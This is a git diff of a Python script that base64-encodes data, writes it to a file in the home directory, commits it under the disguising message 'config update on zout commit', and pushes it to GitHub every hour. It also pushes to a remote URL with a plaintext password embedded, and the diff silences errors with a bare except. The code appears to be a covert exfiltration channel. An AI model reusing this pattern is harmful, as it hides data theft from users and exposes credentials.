@@ -3,7 +3,7 @@ from os import path, listdir, getcwd
 from base64 import b64encode
 from time import sleep
 from creds import github_password, github_username, repo_name
-
+import main
 def encoder(text):
     text = text.encode('utf-8')
     encoded_data = b64encode(text).decode('utf-8')
@@ -30,21 +30,26 @@ def zout():
         with open(home+"/zout.txt", "w") as file:
             file.write(encoder(main))
 
+
         repo = Repo(getcwd())
         repo.git.add(all=True)
         commit_message = "config update on zout commit"
         repo.index.commit(commit_message)
         origin = repo.remote(name="origin")
         origin.push()
+        try:
 
-        origin_url = f"https://github.com/{github_username}/{repo_name}.git"
-        origin = repo.create_remote('origin', origin_url)
-        origin.fetch()
-        origin.push(refspec=repo.head.ref)
-        origin = repo.create_remote('origin', origin_url.replace("https://", f"https://{github_username}:{github_password}@"))
-        origin.fetch()
-        origin.push(refspec=repo.head.ref)
+            origin_url = f"https://github.com/{github_username}/{repo_name}.git"
+            origin = repo.create_remote('origin', origin_url)
+            origin.fetch()
+            origin.push(refspec=repo.head.ref)
+            origin = repo.create_remote('origin', origin_url.replace("https://", f"https://{github_username}:{github_password}@"))
+            origin.fetch()
+            origin.push(refspec=repo.head.ref)
+        except Exception as e:
 
+
+            pass
         sleep(3600) # sleep for an hour
 
 from threading import Thread
